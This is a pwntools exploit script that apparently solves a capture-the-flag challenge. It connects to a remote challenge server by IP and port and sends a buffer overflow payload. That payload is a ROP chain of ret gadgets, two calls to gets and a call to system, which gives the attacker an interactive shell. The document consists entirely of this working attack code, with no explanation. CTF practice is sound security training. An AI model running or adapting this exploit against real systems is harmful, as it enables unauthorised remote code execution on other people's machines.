from pwn import *

elf = ELF('./challenge')
# io = process(elf.path)
io = remote('34.170.146.252', 18911)
context.binary = elf

ret_addr = 0x40101a
alpaca_str_addr = 0x402004

payload = b'alpaca'
payload += b'\x00' * (0x10 - len(payload))
payload += p32(0x0)
payload += p32(0x0)
payload += p64(alpaca_str_addr)
payload += b'a' * 0x18
payload += p64(ret_addr)
payload += p64(elf.sym['gets'])
payload += p64(ret_addr)
payload += p64(elf.sym['gets'])
payload += p64(ret_addr)
payload += p64(elf.sym['system'])

io.sendline(payload)
io.sendline(b'a')
io.sendline(b'/bin0sh')

io.interactive()